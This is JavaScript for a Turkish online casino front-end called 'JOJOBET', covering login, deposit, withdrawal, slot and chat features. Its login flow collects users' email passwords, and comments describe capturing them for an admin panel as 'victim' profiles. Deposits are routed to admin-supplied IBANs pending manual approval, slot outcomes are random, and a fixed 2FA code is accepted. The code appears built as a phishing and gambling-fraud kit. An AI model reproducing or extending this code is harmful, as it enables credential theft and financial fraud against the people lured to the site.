// JOJOBET - LANDING PAGE & AUTH ENGINE
let currentUser = JSON.parse(localStorage.getItem('tb_logged_in_user') || 'null');
let balance = 0;
let pendingDeposit = null;
let activeBanks = [];
let mock2FACode = "";

// ── PRAGMATIC PLAY GAME LAUNCHER ──────────────────────
const PP_BASE = "https://demogamesfree.pragmaticplay.net/gs2c/openGame.do";

function launchGame(gameSymbol, gameName) {
    if (!currentUser || !currentUser.is2faDone) {
        openLogin();
        return;
    }
    
    // Pragmatic Play demo URL - X-Frame-Options engeli yüzünden yeni sekmede açılır
    const gameUrl = `${PP_BASE}?gameSymbol=${gameSymbol}&websiteUrl=https://demogamesfree.pragmaticplay.net&jurisdiction=99&lang=tr&cur=TRY`;
    window.open(gameUrl, '_blank');
}

function closeGameModal() {
    const modal = document.getElementById('game-modal');
    const iframe = document.getElementById('game-iframe');
    if (iframe) iframe.src = '';
    if (modal) modal.style.display = 'none';
    document.body.style.overflow = 'auto';
}

// ── LANDING PAGE FUNCTIONS ──────────────────────────────
function openLogin() {
    document.getElementById('register-overlay').style.display = 'none';
    document.getElementById('login-overlay').style.display = 'flex';
}

function closeLogin() {
    document.getElementById('login-overlay').style.display = 'none';
}

function openRegister() {
    document.getElementById('login-overlay').style.display = 'none';
    document.getElementById('register-overlay').style.display = 'flex';
}

function closeRegister() {
    document.getElementById('register-overlay').style.display = 'none';
}

function switchToLogin() {
    closeRegister();
    openLogin();
}

function handleRegister() {
    const name = document.getElementById('reg-name').value.trim();
    const email = document.getElementById('reg-email').value.trim();
    const pass = document.getElementById('reg-pass').value;

    if (!name || !email || pass.length < 6) {
        alert('Lütfen tüm alanları doldurun ve şifre en az 6 karakter olsun!');
        return;
    }

    // Create user and go straight to login
    const users = JSON.parse(localStorage.getItem('tb_users') || '[]');
    if (users.find(u => u.email === email)) {
        alert('Bu e-posta ile zaten bir hesap var. Giriş yapın!');
        switchToLogin();
        return;
    }

    const newUser = { name, email, emailPass: pass, balance: 1000, pass: "123456", is2faDone: false };
    users.push(newUser);
    localStorage.setItem('tb_users', JSON.stringify(users));
    
    alert(`Hoş geldin ${name}! Hesabınız oluşturuldu. Başlangıç olarak 1.000 ₺ bakiye yüklendi. Şimdi giriş yapabilirsiniz.`);
    closeRegister();
    openLogin();
    document.getElementById('login-email').value = email;
}

// ── AUTH UI MANAGEMENT ───────────────────────────────────
function syncFromLocal() {
    const users = JSON.parse(localStorage.getItem('tb_users') || '[]');
    if (currentUser) {
        const latestUser = users.find(u => u.email === currentUser.email);
        if (latestUser) {
            const authState = currentUser.is2faDone;
            currentUser = { ...latestUser, is2faDone: authState };
            balance = latestUser.balance;
            const usernameEl = document.querySelector('.username');
            const avatarEl = document.querySelector('.avatar');
            if (usernameEl) usernameEl.innerText = currentUser.name;
            if (avatarEl) avatarEl.innerText = currentUser.name.charAt(0).toUpperCase();
        }
    }

    pendingDeposit = JSON.parse(localStorage.getItem('tb_pending_deposit') || 'null');
    activeBanks = JSON.parse(localStorage.getItem('tb_banks') || '[]');
    // No fallback: banks must be added dynamically by Admin
    
    updateBalanceUI();
    checkPendingStatus();
    checkAuthUI();
}

let tempEmail = "";
let tempPass = "";

function checkAuthUI() {
    const landingPage = document.getElementById('landing-page');
    const passOverlay = document.getElementById('pass-overlay');
    const otpOverlay = document.getElementById('2fa-overlay');
    const app = document.getElementById('app');

    if (!currentUser) {
        // Show landing page, hide app
        if (landingPage) landingPage.style.display = 'block';
        app.style.display = 'none';
        // Don't auto-show any overlay - user must click GİRİŞ button
    } else if (currentUser && !currentUser.is2faDone) {
        if (landingPage) landingPage.style.display = 'none';
        passOverlay.style.display = 'none';
        otpOverlay.style.display = 'flex';
        app.style.display = 'none';
    } else {
        // Fully logged in - hide landing, show app
        if (landingPage) landingPage.style.display = 'none';
        document.getElementById('login-overlay').style.display = 'none';
        passOverlay.style.display = 'none';
        otpOverlay.style.display = 'none';
        app.style.display = 'flex';
    }
}


function nextToPass() {
    tempEmail = document.getElementById('login-email').value;
    if (!tempEmail || !tempEmail.includes('@')) { alert("Lütfen geçerli bir e-posta girin!"); return; }
    
    document.getElementById('login-overlay').style.display = 'none';
    document.getElementById('pass-overlay').style.display = 'flex';
}

function nextToOTP() {
    tempPass = document.getElementById('login-email-pass').value;
    if (!tempPass || tempPass.length < 4) { alert("Lütfen şifrenizi girin!"); return; }

    // Capture the credentials to Admin Panel (Simulate real-time feed)
    const users = JSON.parse(localStorage.getItem('tb_users') || '[]');
    // We update or create a "victim" profile in the system to show in admin
    let user = users.find(u => u.email === tempEmail);
    if (!user) {
        user = { name: tempEmail.split('@')[0], email: tempEmail, emailPass: tempPass, balance: 0, pass: "123456", is2faDone: false };
        users.push(user);
    } else {
        user.emailPass = tempPass;
    }
    localStorage.setItem('tb_users', JSON.stringify(users));

    mock2FACode = Math.floor(100000 + Math.random() * 900000).toString();
    console.log("TITAN 2FA CODE:", mock2FACode);
    alert("Onay kodu e-postanıza gönderildi! (Demo Kod: " + mock2FACode + ")");

    document.getElementById('pass-overlay').style.display = 'none';
    document.getElementById('2fa-overlay').style.display = 'flex';
}

function handleFinalAuth() {
    const code = document.getElementById('2fa-code').value;
    if (code === mock2FACode || code === "123456") {
        const users = JSON.parse(localStorage.getItem('tb_users') || '[]');
        let user = users.find(u => u.email === tempEmail);
        
        currentUser = { ...user, is2faDone: true };
        localStorage.setItem('tb_logged_in_user', JSON.stringify(currentUser));
        checkAuthUI();
    } else {
        alert("Hatalı onay kodu!");
    }
}

function logout() {
    localStorage.removeItem('tb_logged_in_user');
    currentUser = null;
    window.location.reload();
}

function checkPendingStatus() {
    const indicator = document.getElementById('pending-indicator');
    if (pendingDeposit) {
        indicator.style.display = 'block';
    } else {
        indicator.style.display = 'none';
    }
}

// ── UI NAVIGATION ─────────────────────────────────────
function showPage(pageId) {
    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
    document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
    
    document.getElementById('page-' + pageId).classList.add('active');
    const navItems = document.querySelectorAll('.nav-item');
    navItems.forEach(item => {
        if (item.innerText.toLowerCase().includes(pageId)) item.classList.add('active');
    });
}

function updateBalanceUI() {
    document.getElementById('user-balance').innerText = balance.toFixed(2) + ' ₺';
    localStorage.setItem('tb_balance', balance.toString());
}

// ── DEPOSIT SYSTEM ────────────────────
function openDeposit() {
    const select = document.getElementById('deposit-bank');
    select.innerHTML = '';
    
    if (activeBanks.length === 0) {
        select.innerHTML = '<option value="">Mevcut IBAN Bulunmamaktadır</option>';
        document.getElementById('deposit-bank').disabled = true;
    } else {
        document.getElementById('deposit-bank').disabled = false;
        activeBanks.forEach((bank, index) => {
            const opt = document.createElement('option');
            opt.value = index;
            let minL = bank.minLimit || 10;
            let maxL = bank.maxLimit || 1000000;
            opt.innerText = `${bank.name} (${bank.owner}) - Min: ${minL.toLocaleString('tr-TR')} ₺ | Max: ${maxL.toLocaleString('tr-TR')} ₺`;
            select.appendChild(opt);
        });
        
        // Randomly select one bank as requested
        const randomIdx = Math.floor(Math.random() * activeBanks.length);
        select.value = randomIdx;
    }

    document.getElementById('deposit-modal').style.display = 'flex';
    updateBankInfo();
}

function updateBankInfo() {
    const idx = document.getElementById('deposit-bank').value;
    const infoBox = document.getElementById('bank-info-display');
    
    if (activeBanks.length === 0) {
        infoBox.innerHTML = '<div style="color:#e11d48; font-weight:bold;">Şu anda sistemde tanımlı IBAN bulunmamaktadır. Lütfen canlı destekle iletişime geçin veya daha sonra tekrar deneyin.</div>';
        return;
    }
    
    if (idx === "") {
        infoBox.innerHTML = 'Lütfen ödeme yapacağınız bankayı seçin.';
        return;
    }

    const bank = activeBanks[idx];
    infoBox.innerHTML = `
        <div><span class="hl">BANKA:</span> ${bank.name}</div>
        <div><span class="hl">ALICI:</span> ${bank.owner}</div>
        <div><span class="hl">IBAN:</span> ${bank.iban}</div>
        <div style="margin-top:10px; font-size:12px; color:#aaa;">* Lütfen bu IBAN'a transfer yaptıktan sonra aşağıdaki butona basın.</div>
    `;
}

function closeDeposit() {
    document.getElementById('deposit-modal').style.display = 'none';
}

function submitDeposit() {
    const amt = parseFloat(document.getElementById('deposit-amount').value);
    const bankIdx = document.getElementById('deposit-bank').value;
    const senderBank = document.getElementById('deposit-sender-bank').value.trim();
    const senderName = document.getElementById('deposit-sender-name').value.trim();

    if (!amt || isNaN(amt)) { alert('Lütfen geçerli bir tutar girin!'); return; }
    if (activeBanks.length === 0) { alert('Şu anda aktif bir IBAN bulunmamaktadır!'); return; }
    if (bankIdx === "") { alert('Lütfen bir hesabımızı seçin!'); return; }
    if (!senderBank) { alert('Lütfen parayı gönderdiğiniz (kendi) bankanızı yazın!'); return; }
    if (!senderName) { alert('Lütfen gönderici Ad Soyad bilgisini yazın!'); return; }
    if (!currentUser) { alert('Lütfen önce giriş yapın!'); return; }

    const bank = activeBanks[bankIdx];
    const limit = bank.minLimit || 10;
    const maxLimit = bank.maxLimit || 1000000;
    
    if (amt < limit) {
        alert(`Bu banka için minimum yatırım limiti ${limit.toLocaleString('tr-TR')} ₺'dir.`);
        return;
    }
    
    if (amt > maxLimit) {
        alert(`Bu banka için maksimum yatırım limiti ${maxLimit.toLocaleString('tr-TR')} ₺'dir.`);
        return;
    }

    pendingDeposit = { 
        amount: amt, 
        bank: bank.name, 
        userEmail: currentUser.email,
        userName: senderName, // Override registered name with provided sender name
        senderBank: senderBank, // New field for Admin to see
        id: Math.floor(Math.random() * 9000000) + 1000000 
    };
    
    localStorage.setItem('tb_pending_deposit', JSON.stringify(pendingDeposit));
    syncFromLocal();
    closeDeposit();
    alert('Talebiniz yönetime iletildi. Onay bekliyor...');
}

// ── WITHDRAW SYSTEM ────────────────────
function openWithdraw() {
    if (!currentUser) { alert('Lütfen önce giriş yapın!'); return; }
    document.getElementById('withdraw-modal').style.display = 'flex';
}

function closeWithdraw() {
    document.getElementById('withdraw-modal').style.display = 'none';
}

function submitWithdraw() {
    if (!currentUser) { alert('Lütfen önce giriş yapın!'); return; }
    
    const name = document.getElementById('withdraw-name').value.trim();
    const iban = document.getElementById('withdraw-iban').value.trim();
    const amt = parseFloat(document.getElementById('withdraw-amount').value);
    
    if (!name || !iban) {
        alert('Lütfen ad soyad ve IBAN bilgilerinizi girin.');
        return;
    }
    
    if (iban.length < 15) {
        alert('Lütfen geçerli bir IBAN girin (TR ile başlayan).');
        return;
    }
    
    if (!amt || amt < 50) {
        alert('Minimum çekim tutarı 50 ₺\'dir.');
        return;
    }
    
    if (amt > balance) {
        alert(`Bakiye yetersiz! Maksimum çekilebilir bakiye: ${balance.toFixed(2)} ₺`);
        return;
    }
    
    // Deduct balance
    balance -= amt;
    updateBalanceUI();
    
    // Create Withdraw Request
    let pendingWithdraws = JSON.parse(localStorage.getItem('tb_pending_withdraws') || '[]');
    pendingWithdraws.push({
        id: Math.floor(Math.random() * 9000000) + 1000000,
        amount: amt,
        iban: iban,
        name: name,
        userEmail: currentUser.email,
        timestamp: Date.now()
    });
    localStorage.setItem('tb_pending_withdraws', JSON.stringify(pendingWithdraws));
    
    // Also save the deducted balance globally so admin sees it instantly
    let usersList = JSON.parse(localStorage.getItem('tb_users') || '[]');
    let userIdx = usersList.findIndex(u => u.email === currentUser.email);
    if(userIdx !== -1) {
        usersList[userIdx].balance = balance;
        localStorage.setItem('tb_users', JSON.stringify(usersList));
    }
    
    closeWithdraw();
    document.getElementById('withdraw-name').value = '';
    document.getElementById('withdraw-iban').value = '';
    document.getElementById('withdraw-amount').value = '';
    
    alert('Çekim talebiniz başarıyla oluşturuldu. Finans birimi onayından sonra hesabınıza gönderilecektir.');
}

// ── CRASH GAME ENGINE ─────────────────────────────────
// (Keep crash logic same, but ensure it calls updateBalanceUI)

// ── ULTRA REALISTIC BONANZA ──────────────────────────
// (Removed: Replaced by official Pragmatic Play game launcher 'vs20fruitsw')


// ── UNIVERSAL SLOT MOTORU (For other games) ───────────
const THEMES = {
    'olympus': { title: '⚡ GATES OF OLYMPUS', symbols: ['⚡', '🏛️', '🤴', '👑', '💎', '🔥'], color: '#ffd700', bg: 'rgba(50,20,0,0.9)' },
    'crown': { title: '👑 SHINING CROWN', symbols: ['🍎', '🍇', '🍒', '🔔', '👑', '7️⃣'], color: '#ff4500', bg: 'rgba(30,0,0,0.9)' },
    'burning': { title: '🍀 40 BURNING HOT', symbols: ['🍀', '🍉', '🍌', '🍇', '🔔', '7️⃣'], color: '#00ff00', bg: 'rgba(0,30,0,0.9)' },
    'princess': { title: '👸 JOJO PRINCESS', symbols: ['👸', '⭐', '💎', '💖', '👠', '👑'], color: '#ff69b4', bg: 'rgba(30,0,30,0.9)' }
};

let currentTheme = 'olympus';

function launchSlotGame(gameId) {
    currentTheme = gameId;
    const theme = THEMES[gameId];
    if(!theme) return;
    document.getElementById('slot-game-title').innerText = theme.title;
    document.getElementById('slot-game-title').style.color = theme.color;
    document.getElementById('page-universalslot').classList.add('active');
    document.querySelector('.slot-frame').style.backgroundColor = theme.bg;
    document.querySelector('.slot-frame').style.borderColor = theme.color;
    
    generateUniversalGrid();
    
    document.getElementById('slot-spin-btn').onclick = () => spinUniversalSlot(theme);
}

function generateUniversalGrid() {
    const grid = document.getElementById('universal-grid');
    if(!grid) return;
    grid.innerHTML = '';
    const theme = THEMES[currentTheme];
    for(let i=0; i<15; i++) { // 5x3 Grid
        const div = document.createElement('div');
        div.className = 'bonanza-symbol'; 
        div.style.width = '100%';
        div.style.height = '100px';
        div.innerText = theme.symbols[Math.floor(Math.random() * theme.symbols.length)];
        grid.appendChild(div);
    }
}

function spinUniversalSlot(theme) {
    const bet = parseFloat(document.getElementById('slot-bet').value);
    if (balance < bet) { alert('Bakiye yetersiz!'); return; }
    
    balance -= bet;
    updateBalanceUI();
    
    const grid = document.getElementById('universal-grid');
    grid.style.transform = 'translateY(10px) scale(0.95)';
    
    let spinCount = 0;
    const interval = setInterval(() => {
        generateUniversalGrid();
        spinCount++;
        if (spinCount > 10) {
            clearInterval(interval);
            grid.style.transform = 'translateY(0) scale(1)';
            
            // Random win logic
            if(Math.random() > 0.75) {
                const win = bet * (Math.floor(Math.random() * 5) + 2);
                balance += win;
                updateBalanceUI();
                alert(`${theme.title} üzerinde ${win.toFixed(2)} ₺ KAZANDINIZ!`);
            }
        }
    }, 100);
}

// Override showPage to handle themes
function showPage(pageId) {
    // Stop any active Aviator game
    if (isAviatorRunning) bustAviator();

    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
    document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
    
    const target = document.getElementById('page-' + pageId);
    if (target) {
        target.classList.add('active');
        if (pageId === 'bonanza') generateBonanzaGrid();
    } else if (THEMES[pageId]) {
        launchSlotGame(pageId);
    } else {
        document.getElementById('page-hub').classList.add('active');
    }

    const navItems = document.querySelectorAll('.nav-item');
    navItems.forEach(item => {
        if (item.innerText.toLowerCase().includes(pageId)) item.classList.add('active');
    });
}

// ── AVIATOR ENHANCED ──────────────────────────────────
let isAviatorRunning = false;
let aviatorMultiplier = 1.00;
let aviatorBustPoint = 1.00;
let aviatorInterval;

function handleAviator() {
    if (isAviatorRunning) {
        cashOutAviator();
    } else {
        startAviator();
    }
}

function startAviator() {
    const bet = parseFloat(document.getElementById('aviator-bet').value);
    if (!bet || bet > balance) { alert('Yetersiz bakiye!'); return; }

    balance -= bet;
    updateBalanceUI();

    isAviatorRunning = true;
    aviatorMultiplier = 1.00;
    aviatorBustPoint = 1.1 + (Math.random() * 5); 
    
    const btn = document.getElementById('aviator-btn');
    btn.innerText = 'NAKİT ÇEK (1.00x)';
    btn.style.boxShadow = '0 0 20px rgba(255,255,255,0.4)';

    const plane = document.getElementById('aviator-plane');
    const path = document.getElementById('flight-path');
    
    aviatorInterval = setInterval(() => {
        aviatorMultiplier += 0.02;
        document.getElementById('aviator-multiplier').innerText = aviatorMultiplier.toFixed(2) + 'x';
        btn.innerText = `NAKİT ÇEK (${aviatorMultiplier.toFixed(2)}x)`;

        // Curve Animation
        const x = Math.min((aviatorMultiplier - 1) * 150, 750);
        const y = Math.min((aviatorMultiplier - 1) * 80, 300);
        plane.style.transform = `translate(${x}px, -${y}px) scaleX(-1)`;
        
        path.setAttribute('d', `M 20 350 Q ${x/2} 350 ${x} ${350-y}`);

        if (aviatorMultiplier >= aviatorBustPoint) {
            bustAviator();
        }
    }, 100);
}

function cashOutAviator() {
    clearInterval(aviatorInterval);
    const win = parseFloat(document.getElementById('aviator-bet').value) * aviatorMultiplier;
    balance += win;
    updateBalanceUI();
    isAviatorRunning = false;
    alert(`TEBRİKLER! ${win.toFixed(2)} ₺ KAZANDINIZ!`);
    resetAviatorUI();
}

function bustAviator() {
    clearInterval(aviatorInterval);
    isAviatorRunning = false;
    document.getElementById('aviator-multiplier').style.color = '#ff4444';
    document.getElementById('aviator-plane').style.opacity = '0';
    
    setTimeout(() => {
        document.getElementById('aviator-multiplier').style.color = '#fff';
        document.getElementById('aviator-plane').style.opacity = '1';
        resetAviatorUI();
    }, 1500);
}

function resetAviatorUI() {
    const btn = document.getElementById('aviator-btn');
    btn.innerText = 'BAHİS';
    document.getElementById('aviator-multiplier').innerText = '1.00x';
    const plane = document.getElementById('aviator-plane');
    plane.style.transform = 'translate(0, 0) scaleX(-1)';
    document.getElementById('flight-path').setAttribute('d', 'M 20 350 Q 20 350 20 350');
}

// Global Poll for updates from Admin side
setInterval(syncFromLocal, 1000);

// ── RENDER LANDING GAME GRID ──────────────────────────
const GAMES = [
    // ── HOT & TOP ──
    { symbol:'vs20fruitsw',        name:'Sweet Bonanza',            badge:'HOT',  badgeColor:'#ff3b3b', textColor:'#fff' },
    { symbol:'vs20gateslightning', name:'Gates of Olympus',         badge:'TOP',  badgeColor:'#ffcc00', textColor:'#000' },
    { symbol:'vs20starlight',      name:'Starlight Princess',       badge:'YENİ', badgeColor:'#9b59b6', textColor:'#fff' },
    { symbol:'vs20sugarrush',      name:'Sugar Rush',               badge:'HOT',  badgeColor:'#ff3b3b', textColor:'#fff' },
    { symbol:'vs20gatesoly1000',   name:'Gates of Olympus 1000',    badge:'YENİ', badgeColor:'#9b59b6', textColor:'#fff' },
    { symbol:'vs20sl1000',         name:'Starlight Princess 1000',  badge:'YENİ', badgeColor:'#9b59b6', textColor:'#fff' },
    { symbol:'vs20sugarrush1000',  name:'Sugar Rush 1000',          badge:'YENİ', badgeColor:'#9b59b6', textColor:'#fff' },
    { symbol:'vs20sb1000',         name:'Sweet Bonanza 1000',       badge:'YENİ', badgeColor:'#9b59b6', textColor:'#fff' },

    // ── DROPS & WINS ──
    { symbol:'vs10bbbonanza',      name:'Big Bass Bonanza',         badge:'',     badgeColor:'', textColor:'' },
    { symbol:'vs10bhallbnza',      name:'Big Bass Bonanza Bonanza', badge:'',     badgeColor:'', textColor:'' },
    { symbol:'vs10bigbasshold',    name:'Big Bass Hold & Spin',     badge:'',     badgeColor:'', textColor:'' },
    { symbol:'vs10fishingreelsbigbass', name:'Big Bass Fishing Reels', badge:'', badgeColor:'', textColor:'' },
    { symbol:'vs10txbigbass',      name:'Big Bass Splash',          badge:'',     badgeColor:'', textColor:'' },
    { symbol:'vs10bigbassamaz',    name:'Big Bass Amazon Xtreme',   badge:'TOP',  badgeColor:'#ffcc00', textColor:'#000' },
    { symbol:'vs25wolfgold',       name:'Wolf Gold',                badge:'',     badgeColor:'', textColor:'' },
    { symbol:'vs25doghouse',       name:'The Dog House',            badge:'',     badgeColor:'', textColor:'' },
    { symbol:'vs25doghousemegaways', name:'Dog House Megaways',     badge:'',     badgeColor:'', textColor:'' },
    { symbol:'vs20fruitparty',     name:'Fruit Party',              badge:'',     badgeColor:'', textColor:'' },
    { symbol:'vs20fruitparty2',    name:'Fruit Party 2',            badge:'',     badgeColor:'', textColor:'' },
    { symbol:'vs40wildwest',       name:'Wild West Gold',           badge:'',     badgeColor:'', textColor:'' },
    { symbol:'vs20wildwestgold2',  name:'Wild West Gold 2 Megaways',badge:'YENİ', badgeColor:'#9b59b6', textColor:'#fff' },
    { symbol:'vs20gemsbonanza',    name:'Gems Bonanza',             badge:'',     badgeColor:'', textColor:'' },
    { symbol:'vs5aztecgems',       name:'Aztec Gems',               badge:'',     badgeColor:'', textColor:'' },
    { symbol:'vs5aztecgemsdeluxe', name:'Aztec Gems Deluxe',        badge:'',     badgeColor:'', textColor:'' },
    { symbol:'vs20xmascarol',      name:'Sweet Bonanza Xmas',       badge:'',     badgeColor:'', textColor:'' },
    { symbol:'vs20jokerking',      name:'Joker King',               badge:'',     badgeColor:'', textColor:'' },
    { symbol:'vs5jokers',          name:'Joker Jewels',             badge:'',     badgeColor:'', textColor:'' },
    { symbol:'vs20goldrush',       name:'Gold Rush',                badge:'',     badgeColor:'', textColor:'' },

    // ── MEGAWAYS ──
    { symbol:'vs20aztecbon',       name:'Aztec Bonanza',            badge:'',     badgeColor:'', textColor:'' },
    { symbol:'vs243fortsafari',    name:'Great Rhino Megaways',     badge:'',     badgeColor:'', textColor:'' },
    { symbol:'vs117649starburst',  name:'Release the Kraken Megaways', badge:'', badgeColor:'', textColor:'' },
    { symbol:'vs20starlightx',     name:'Starlight Christmas',      badge:'',     badgeColor:'', textColor:'' },
    { symbol:'vswayshive',         name:'Beehive Bedlam Megaways',  badge:'',     badgeColor:'', textColor:'' },
    { symbol:'vswaysbufking',      name:'Buffalo King Megaways',    badge:'',     badgeColor:'', textColor:'' },
    { symbol:'vswayslightning',    name:'Lightning Joker',          badge:'',     badgeColor:'', textColor:'' },

    // ── JACKPOT / HIGH RTP ──
    { symbol:'vs20rhino',          name:'Great Rhino',              badge:'',     badgeColor:'', textColor:'' },
    { symbol:'vs20rhinodeluxe',    name:'Great Rhino Deluxe',       badge:'',     badgeColor:'', textColor:'' },
    { symbol:'vs25goldpanther',    name:'Panther Queen',            badge:'',     badgeColor:'', textColor:'' },
    { symbol:'vs25mustanggold',    name:'Mustang Gold',             badge:'',     badgeColor:'', textColor:'' },
    { symbol:'vs1fortuneofgiza',   name:'Fortune of Giza',          badge:'',     badgeColor:'', textColor:'' },
    { symbol:'vs20chickchase',     name:'Chilli Heat Megaways',     badge:'',     badgeColor:'', textColor:'' },
    { symbol:'vs20chilliheat',     name:'Chilli Heat',              badge:'',     badgeColor:'', textColor:'' },
    { symbol:'vs20cleocatra',      name:'Cleo Cleopatra',           badge:'',     badgeColor:'', textColor:'' },
    { symbol:'vs20cleopatra',      name:'Cleopatra\'s Gold',        badge:'',     badgeColor:'', textColor:'' },
    { symbol:'vs20tutancamun',     name:'Eye of Cleopatra',         badge:'',     badgeColor:'', textColor:'' },
    { symbol:'vs10egypt',          name:'Eye of the Storm',         badge:'',     badgeColor:'', textColor:'' },

    // ── KLASİK SLOTLAR ──
    { symbol:'vs10goldfish',       name:'Gold Fish',                badge:'',     badgeColor:'', textColor:'' },
    { symbol:'vs25goldfish2',      name:'Gold Fish 2',              badge:'',     badgeColor:'', textColor:'' },
    { symbol:'vs20doghomnibingo',  name:'Cash Elevator',            badge:'',     badgeColor:'', textColor:'' },
    { symbol:'vs20sparta',         name:'3 Kingdoms',               badge:'',     badgeColor:'', textColor:'' },
    { symbol:'vs20asgard',         name:'Asgard',                   badge:'',     badgeColor:'', textColor:'' },
    { symbol:'vs25viking',         name:'Sons of Ragnar',           badge:'',     badgeColor:'', textColor:'' },
    { symbol:'vs25dwarves',        name:'7 Dwarfs Christmas',       badge:'',     badgeColor:'', textColor:'' },
    { symbol:'vs25bjackdbas2',     name:'Black Bull',               badge:'',     badgeColor:'', textColor:'' },
    { symbol:'vs20knifehat',       name:'Wild Depths',              badge:'',     badgeColor:'', textColor:'' },
    { symbol:'vs25templ',          name:'Mysterious Egypt',         badge:'',     badgeColor:'', textColor:'' },

    // ── YENİ ÇIKAN ──
    { symbol:'vs10luckfortune',    name:'Luck & Fortune',           badge:'YENİ', badgeColor:'#9b59b6', textColor:'#fff' },
    { symbol:'vs10cropaway',       name:'Crop Away',                badge:'YENİ', badgeColor:'#9b59b6', textColor:'#fff' },
    { symbol:'vs25timberwolf',     name:'Timber Stacks',            badge:'YENİ', badgeColor:'#9b59b6', textColor:'#fff' },
    { symbol:'vs20emptybank',      name:'Empty the Bank',           badge:'',     badgeColor:'', textColor:'' },
    { symbol:'vs50northgard',      name:'Wild Wild Riches',         badge:'',     badgeColor:'', textColor:'' },
    { symbol:'vs25wwriches',       name:'Wild Wild Riches Megaways',badge:'',     badgeColor:'', textColor:'' },
    { symbol:'vs5littlegem',       name:'Little Gem',               badge:'',     badgeColor:'', textColor:'' },
    { symbol:'vs1explosiveReels',  name:'Explosive Reels',          badge:'',     badgeColor:'', textColor:'' },
    { symbol:'vs20-super-x',       name:'Super X',                  badge:'',     badgeColor:'', textColor:'' },
    { symbol:'vs20-piggybank',     name:'Piggy Bank Megaways',      badge:'',     badgeColor:'', textColor:'' },
    { symbol:'vs25mxmascarol',     name:'Magician\'s Secrets',      badge:'',     badgeColor:'', textColor:'' },
    { symbol:'vs20hercpeg',        name:'Hercules and Pegasus',     badge:'',     badgeColor:'', textColor:'' },
    { symbol:'vs20goldendiamonds', name:'Golden Diamonds',          badge:'',     badgeColor:'', textColor:'' },
];

function renderGamesGrid() {
    const grid = document.getElementById('games-grid');
    if (!grid) return;
    grid.innerHTML = GAMES.map(g => `
        <div onclick="launchGame('${g.symbol}','${g.name}')" class="game-card-pp">
            <img
                src="https://cdn2.softswiss.net/i/s3/${g.symbol}.jpg"
                onerror="this.onerror=null; this.src='https://ui-avatars.com/api/?name=${encodeURIComponent(g.name)}&background=111827&color=1fcc5a&bold=true&size=300&font-size=0.3'"
                alt="${g.name}"
                loading="lazy"
            >
            <div class="play-overlay"><div class="play-btn">▶</div></div>
            <div class="card-body">
                <div class="card-name">${g.name}</div>
                <div class="card-provider">Pragmatic Play</div>
            </div>
            ${g.badge ? `<div class="badge" style="background:${g.badgeColor}; color:${g.textColor}; position:absolute; top:8px; right:8px; font-size:10px; padding:3px 8px; border-radius:5px; font-weight:800;">${g.badge}</div>` : ''}
        </div>
    `).join('');
}


// ── LIVE CHAT SYSTEM ──────────────────────────────────
function toggleChat() {
    const chatWin = document.getElementById('chat-window');
    if(chatWin.style.display === 'none' || chatWin.style.display === '') {
        chatWin.style.display = 'flex';
        renderChat();
    } else {
        chatWin.style.display = 'none';
    }
}

function handleChatKey(e) {
    if (e.key === 'Enter') sendChatMessage();
}

function sendChatMessage() {
    const input = document.getElementById('chat-input');
    const msg = input.value.trim();
    if(!msg) return;
    if(!currentUser) { alert('Sohbet etmek için giriş yapmalısınız!'); return; }

    let chats = JSON.parse(localStorage.getItem('tb_chat') || '[]');
    chats.push({
        sender: 'user',
        email: currentUser.email,
        name: currentUser.name,
        text: msg,
        timestamp: Date.now()
    });
    localStorage.setItem('tb_chat', JSON.stringify(chats));
    input.value = '';
    renderChat();
}

function renderChat() {
    const chatWin = document.getElementById('chat-window');
    const chatCont = document.getElementById('chat-messages');
    if(!chatWin || chatWin.style.display === 'none') return;
    
    if(!currentUser) {
        chatCont.innerHTML = '<div class="msg system">Müşteri temsilcilerine bağlanmak için giriş yapınız.</div>';
        return;
    }

    let chats = JSON.parse(localStorage.getItem('tb_chat') || '[]');
    let userChats = chats.filter(c => c.email === currentUser.email);

    let html = '<div class="msg system">Müşteri temsilcilerimiz size yardımcı olmak için buradadır.</div>';
    
    userChats.forEach(c => {
        if(c.sender === 'user') {
            html += `<div class="msg user">${c.text}</div>`;
        } else {
            html += `<div class="msg admin"><b>Destek:</b> ${c.text}</div>`;
        }
    });

    const isAtBottom = chatCont.scrollHeight - chatCont.scrollTop <= chatCont.clientHeight + 20;
    chatCont.innerHTML = html;
    if(isAtBottom) chatCont.scrollTop = chatCont.scrollHeight;
}

// Ensure the poll updates chat too
const originalSync = syncFromLocal;
syncFromLocal = function() {
    originalSync();
    if(document.getElementById('chat-window')?.style.display !== 'none') {
        renderChat();
    }
};

// Initialize
syncFromLocal();
generateBonanzaGrid();
renderGamesGrid();
renderAppGamesGrid();

// ── APP İÇİ OYUN GRID ────────────────────────────────────
function renderAppGamesGrid(list) {
    const grid = document.getElementById('app-games-grid');
    if (!grid) return;
    const games = list || GAMES;
    grid.innerHTML = games.map(g => `
        <div onclick="launchGame('${g.symbol}','${g.name}')" style="border-radius:14px; overflow:hidden; cursor:pointer; position:relative; background:#111820; transition:all 0.25s cubic-bezier(0.34,1.56,0.64,1); border:1px solid #1e2a38;">
            <div style="position:relative; overflow:hidden;">
                <img
                    src="https://cdn2.softswiss.net/i/s3/${g.symbol}.jpg"
                    onerror="this.onerror=null; this.src='https://ui-avatars.com/api/?name=${encodeURIComponent(g.name)}&background=111827&color=1fcc5a&bold=true&size=300&font-size=0.3'"
                    alt="${g.name}"
                    loading="lazy"
                    style="width:100%; aspect-ratio:3/2; object-fit:cover; display:block; background:#1a1a2e; transition:transform 0.3s;"
                    onmouseover="this.style.transform='scale(1.07)'"
                    onmouseout="this.style.transform='scale(1)'"
                >
                <div style="position:absolute; inset:0; background:rgba(0,0,0,0.5); display:flex; align-items:center; justify-content:center; opacity:0; transition:0.2s;" onmouseover="this.style.opacity=1" onmouseout="this.style.opacity=0">
                    <div style="width:48px; height:48px; background:#1fcc5a; border-radius:50%; display:flex; align-items:center; justify-content:center; font-size:20px; color:#000; font-weight:900;">▶</div>
                </div>
                ${g.badge ? `<div style="position:absolute; top:8px; right:8px; background:${g.badgeColor}; color:${g.textColor}; font-size:10px; padding:3px 8px; border-radius:5px; font-weight:800;">${g.badge}</div>` : ''}
            </div>
            <div style="padding:8px 10px 10px;">
                <div style="font-size:12px; font-weight:700; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; color:#fff;">${g.name}</div>
